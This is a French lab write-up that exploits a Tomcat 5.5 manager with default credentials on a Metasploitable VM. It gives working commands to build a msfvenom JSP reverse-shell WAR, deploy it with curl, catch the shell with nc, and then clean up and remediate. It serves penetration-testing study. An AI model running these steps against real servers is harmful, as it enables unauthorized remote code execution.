# Write-up — Tomcat Manager : déploiement de WAR malveillant (Metasploitable 1, port 8180)

Cible : `192.168.56.102` · CVE-2009-3548 (identifiants manager par défaut) · Résultat : shell `tomcat55`.

> **Note réseau.** Mon coéquipier et moi travaillons sur deux réseaux host-only VirtualBox
> différents : lui garde `172.28.128.x` (`vboxnet1`, comme dans `parcours.md` et les autres
> write-ups), moi je suis sur `vboxnet0` → la VM est en `192.168.56.102` et mon poste Kali en
> `192.168.56.1`. Les IP ci-dessous sont donc les miennes ; côté coéquipier, remplacer
> `192.168.56.102` → `172.28.128.4` et `192.168.56.1` → `172.28.128.1`. Rien d'autre ne change.

Tout ce qui suit est copier-coller direct (testé en zsh), lancé depuis **🖥 Kali** (la cible est
distante, pas besoin de la console de la VM pour ce service).

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 8180 192.168.56.102
```
Sortie :
```
PORT     STATE SERVICE VERSION
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
```
→ **Apache Tomcat 5.5** derrière le connecteur Coyote. Un Tomcat expose en général une
application d'administration (`/manager`) qui permet de déployer des applications web — c'est la
piste à vérifier en premier.

## 2. Énumération — l'interface manager et ses identifiants

Avant de chercher un exploit, on teste l'hypothèse la plus simple : le manager est-il accessible,
et avec les identifiants par défaut de Metasploitable (`tomcat:tomcat`) ?

🖥 Kali :
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.102:8180/manager/html
curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://192.168.56.102:8180/manager/html
```
Sortie :
```
401        ← sans authentification : refusé
200        ← avec tomcat:tomcat : accès accordé
```
→ Les identifiants par défaut `tomcat:tomcat` ouvrent l'interface **Tomcat Web Application
Manager**. C'est la faille : le manager autorise le déploiement d'applications web arbitraires,
donc un accès au manager = exécution de code sur le serveur.

## 3. Identifier la vulnérabilité (faille connue + CVE + mécanisme)

Question indépendante de tout outil : existe-t-il une faille connue pour cet usage ? On commence
par le plus léger (`searchsploit`), puis on va chercher la CVE dans le module Metasploit
correspondant.

🖥 Kali :
```bash
searchsploit tomcat manager
```
Sortie (extrait) :
```
Apache Tomcat Manager - Application Deployer ... | multiple/remote/16317.rb
Apache Tomcat Manager - Application Upload (A... | multiple/remote/31433.rb
```
→ Une faille connue existe bien : l'abus du *Application Deployer* du manager.

Pour obtenir la CVE précise et le mécanisme, on lit les infos du module cité dans `parcours.md` :
```bash
msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
```
Sortie (extraits) :
```
Name: Apache Tomcat Manager Application Deployer Authenticated Code Execution
Disclosed: 2009-11-09
...
References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548   ← identifiants par défaut du manager
  https://nvd.nist.gov/vuln/detail/CVE-2009-3843
  ...
  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html
```
→ **CVE-2009-3548** : Tomcat livré avec des comptes manager par défaut (`tomcat/tomcat`,
`admin`, ...). Ce n'est pas un bug de code mais une **configuration par défaut dangereuse**.

**Mécanisme.** Le manager Tomcat expose une fonction de déploiement (`/manager/deploy`) qui
accepte une archive `.war` et la rend immédiatement accessible comme application web. Un `.war`
peut contenir une page JSP, c'est-à-dire du code Java exécuté côté serveur. En déposant un `.war`
qui contient un reverse shell JSP puis en visitant la page, on fait exécuter notre code par le
processus Tomcat → exécution de code à distance (RCE), avec les droits de l'utilisateur système
qui fait tourner Tomcat (`tomcat55`).

## 4. Exploitation manuelle (msfvenom + curl, sans lancer l'exploit Metasploit)

On reproduit à la main ce que ferait le module, pour comprendre chaque étape.

**a) Générer le WAR piégé** — reverse shell JSP qui rappelle mon Kali :
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war -o shell.war
```
Sortie :
```
Payload size: 1105 bytes
Final size of war file: 1105 bytes
Saved as: shell.war
```
Le `.war` contient une JSP au nom aléatoire — on récupère ce nom, il servira d'URL pour déclencher
le shell :
```bash
unzip -l shell.war | grep -i jsp
#   1498  ...  cmpmghwetuqjeet.jsp
```

**b) Démarrer le listener** côté Kali (pour recevoir le reverse shell) :
```bash
nc -lvnp 4444
```

**c) Déployer le WAR** via le manager, avec les identifiants trouvés à l'étape 2 :
```bash
curl -s -u tomcat:tomcat -T shell.war "http://192.168.56.102:8180/manager/deploy?path=/shell"
```
Sortie :
```
OK - Deployed application at context path /shell
```
Vérification que l'appli est bien en ligne :
```bash
curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/list" | grep /shell
# /shell:running:0:shell
```

**d) Déclencher** en visitant la JSP (son exécution ouvre la connexion vers le listener) :
```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://192.168.56.102:8180/shell/cmpmghwetuqjeet.jsp"
# 200
```

## 5. Preuve d'accès

Dans la session reçue sur le listener `nc` (port 4444), commandes exécutées **sur la cible** :
```
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 41993
$ id
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
$ whoami
tomcat55
$ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
$ hostname
metasploitable
```
→ Shell confirmé en tant que **`tomcat55`** (compte de service Tomcat) sur l'hôte
`metasploitable`. Pas root : l'élévation de privilèges sera une étape distincte.

## 6. Nettoyage

Retirer l'application déposée pour laisser la cible propre :
```bash
curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/undeploy?path=/shell"
# OK - Undeployed application at context path /shell
```

---

## Remédiation

- **Changer ou supprimer les comptes manager par défaut** (`tomcat/tomcat`, `admin`...) dans
  `tomcat-users.xml` — cause racine de CVE-2009-3548.
- **Restreindre l'accès au manager** par IP (valve `RemoteAddrValve`) et le réserver à un réseau
  d'administration ; ne jamais l'exposer publiquement.
- Mettre à jour Tomcat (5.5 est obsolète et hors support).
- Faire tourner Tomcat avec un compte système à privilèges minimaux (c'est déjà le cas ici avec
  `tomcat55`, ce qui limite l'impact direct — mais l'accès obtenu reste un point de départ pour
  l'élévation de privilèges).

## Sources

- Session réelle (ce write-up) — recon, énumération et exploitation manuelle.
- `msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy"` → CVE-2009-3548 :
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
- Doc officielle manager Tomcat 5.5 : http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html

**Suite du parcours MS1 :** TikiWiki (port 80), `tikiwiki_graph_formula`.
